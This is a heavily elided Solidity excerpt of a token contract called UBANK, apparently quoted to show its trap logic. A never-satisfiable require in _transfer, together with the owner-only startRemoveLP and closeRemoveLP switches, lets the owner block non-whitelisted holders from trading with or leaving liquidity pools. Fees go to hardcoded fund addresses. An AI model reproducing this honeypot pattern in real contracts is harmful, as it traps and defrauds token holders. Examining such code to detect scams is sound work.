...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (0 == RemoveLPBlock) {
                    require(0 < RemoveLPBlock && _swapPairList[from], "!startRemoveLP");
                }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0x9FE4580F45930d8A515FD03011eaF52e6B222222;
    ...
    function startRemoveLP() external onlyOwner {
        require(0 == RemoveLPBlock, "startRemoveLP");
        RemoveLPBlock = block.number;
    }

    function closeRemoveLP() external onlyOwner {
        RemoveLPBlock = 0;
    }
...
contract UBANK is AbsToken {
    ...
    //USDT
        ...
        1000000,
    //Fund
        address(0x7678bC3835814cFc3e26460fcffB450B90111111),
    //Receive
